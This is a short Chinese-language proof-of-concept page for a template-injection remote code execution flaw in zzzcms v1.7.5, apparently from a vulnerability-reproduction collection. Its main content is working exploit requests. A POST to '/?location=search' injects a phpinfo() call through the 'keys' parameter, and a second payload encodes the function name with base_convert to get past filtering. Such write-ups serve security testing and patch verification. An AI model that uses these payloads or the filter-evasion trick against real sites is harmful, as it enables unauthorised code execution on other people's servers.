# zzzcms v1.7.5 前台远程命令执行漏洞

## 漏洞描述

zzzcms v1.7.5 parserSearch 存在模板注入导致远程命令执行漏洞。

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2021-32605
- https://www.anquanke.com/post/id/212272

## 漏洞影响

```
zzzcms v1.7.5
```

## 漏洞复现

执行 `phpinfo`：

```
POST /?location=search HTTP/1.1
Host: your-ip

keys={if:=phpinfo()}{end if}
```

如果遇到拦截，编码绕过：

```
<?php
echo (base_convert("phpinfo()", 32, 10));
?>
-----
27440799224
```

```
POST /?location=search HTTP/1.1
Host: your-ip

keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}
```

![](images/zzzcms%20v1.7.5%20前台远程命令执行漏洞/image-20250407143723180.png)
